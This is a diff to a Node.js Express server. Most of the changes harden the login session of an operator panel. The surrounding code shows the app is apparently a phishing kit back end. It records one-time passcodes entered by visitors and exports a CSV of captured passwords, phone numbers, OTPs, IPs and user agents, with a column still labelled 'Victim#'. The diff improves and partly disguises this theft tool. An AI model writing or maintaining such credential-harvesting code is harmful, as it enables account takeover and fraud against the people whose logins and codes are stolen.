@@ -30,9 +30,8 @@ app.use((req, res, next) => {
   next();
 });
 
-/* ----------  CACHE CONTROL MIDDLEWARE (CRITICAL FOR CLOUDFLARE) ---------- */
+/* ----------  CACHE CONTROL MIDDLEWARE ---------- */
 app.use((req, res, next) => {
-  // Prevent caching of all panel and API routes
   if (req.path.startsWith('/panel') || req.path.startsWith('/api/')) {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.setHeader('Pragma', 'no-cache');
@@ -56,7 +55,7 @@ app.use((req, res, next) => {
   next();
 });
 
-/* ----------  CUSTOM SESSION MIDDLEWARE ---------- */
+/* ----------  CUSTOM SESSION MIDDLEWARE - FIXED ---------- */
 function signCookie(value, secret) {
   return crypto.createHmac('sha256', secret).update(value).digest('base64url');
 }
@@ -66,11 +65,13 @@ function setSessionCookie(res, data) {
   const signature = signCookie(encoded, SESSION_SECRET);
   const value = `${encoded}.${signature}`;
   
+  // FIXED: Added explicit expiration and secure flags
   res.cookie(COOKIE_NAME, value, {
     httpOnly: true,
     secure: true,
     sameSite: 'lax',
-    maxAge: 24 * 60 * 60 * 1000,
+    maxAge: 24 * 60 * 60 * 1000, // 24 hours
+    expires: new Date(Date.now() + 24 * 60 * 60 * 1000), // Explicit expiration
     path: '/'
   });
 }
@@ -85,7 +86,7 @@ function getSessionCookie(req) {
     
     const expectedSig = signCookie(encoded, SESSION_SECRET);
     if (signature !== expectedSig) {
-      console.log('[DEBUG] Cookie signature mismatch');
+      console.log('[DEBUG] Cookie signature mismatch - possible secret rotation or tampering');
       return null;
     }
     
@@ -101,22 +102,34 @@ function clearSessionCookie(res) {
     path: '/', 
     httpOnly: true, 
     secure: true, 
-    sameSite: 'lax',
-    maxAge: 0
+    sameSite: 'lax'
   });
 }
 
-// Session middleware
+// Session middleware with auto-save on every request
 app.use((req, res, next) => {
   req.session = getSessionCookie(req) || {};
   
-  console.log(`[DEBUG] Host: ${req.headers.host}, Method: ${req.method}, URL: ${req.url}`);
-  console.log(`[DEBUG] Session: ${JSON.stringify(req.session)}`);
+  // Auto-renew session on every request (prevents timeout during active use)
+  if (req.session.authed) {
+    req.session.lastActivity = Date.now();
+  }
+  
+  console.log(`[DEBUG] Host: ${req.headers.host}, URL: ${req.url}, Authed: ${req.session?.authed}`);
   
   req.session.save = () => setSessionCookie(res, req.session);
   req.session.destroy = () => {
     clearSessionCookie(res);
     req.session = {};
+  };
+  
+  // Save session at end of request if modified
+  const originalJson = res.json;
+  res.json = function(data) {
+    if (req.session && req.session.authed) {
+      req.session.save();
+    }
+    return originalJson.call(this, data);
   };
   
   next();
@@ -145,14 +158,14 @@ app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html')
 
 /* ----------  PANEL ACCESS CONTROL  ---------- */
 app.get('/panel', (req, res) => {
-  console.log(`[DEBUG] /panel check - authed: ${req.session?.authed}`);
   if (req.session?.authed === true) {
+    // Refresh session on every panel access
+    req.session.save();
     return res.sendFile(__dirname + '/_panel.html');
   }
   res.sendFile(__dirname + '/access.html');
 });
 
-// CRITICAL FIX: Use 303 redirect for POST-Redirect-GET pattern
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
   console.log(`[DEBUG] Login attempt - user: ${user}`);
@@ -160,9 +173,10 @@ app.post('/panel/login', (req, res) => {
   if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed = true;
     req.session.username = user;
+    req.session.loginTime = Date.now();
+    req.session.lastActivity = Date.now();
     req.session.save();
-    console.log(`[DEBUG] Login success - redirecting`);
-    // Use 303 See Other to force GET request after POST
+    console.log(`[DEBUG] Login success - session saved`);
     return res.redirect(303, '/panel');
   }
   
@@ -334,7 +348,7 @@ app.post('/api/otp', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${s.otp}` });
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
@@ -395,7 +409,12 @@ app.post('/api/interaction', (req, res) => {
 
 /* ----------  PANEL API  ---------- */
 app.get('/api/user', (req, res) => {
-  if (req.session?.authed) return res.json({ username: req.session.username || PANEL_USER });
+  if (req.session?.authed) {
+    // Refresh session on API calls
+    req.session.lastActivity = Date.now();
+    req.session.save();
+    return res.json({ username: req.session.username || PANEL_USER });
+  }
   res.status(401).json({ error: 'Not authenticated' });
 });
 
@@ -422,6 +441,10 @@ function buildPanelPayload() {
 app.get('/api/panel', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
+  // Refresh session on panel data request
+  req.session.lastActivity = Date.now();
+  req.session.save();
+
   const listener = () => res.json(buildPanelPayload());
   events.once('panel', listener);
   setTimeout(() => {
@@ -432,6 +455,10 @@ app.get('/api/panel', (req, res) => {
 
 app.post('/api/panel', async (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
+
+  // Refresh session on panel action
+  req.session.lastActivity = Date.now();
+  req.session.save();
 
   const { action, sid } = req.body;
   const v = sessionsMap.get(sid);
@@ -466,6 +493,10 @@ app.post('/api/panel', async (req, res) => {
 app.get('/api/export', (req, res) => {
   if (!req.session?.authed) return res.status(401).send('Unauthorized');
 
+  // Refresh session
+  req.session.lastActivity = Date.now();
+  req.session.save();
+
   const successes = auditLog
     .filter(r => r.phone && r.otp)
     .map(r => ({
@@ -480,7 +511,7 @@ app.get('/api/export', (req, res) => {
     }));
 
   const csv = [
-    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
+    ['Victim#','Client','Password','Phone','OTP','IP','UA','Timestamp'],
     ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
   ].map(r=>r.join(',')).join('\n');
 
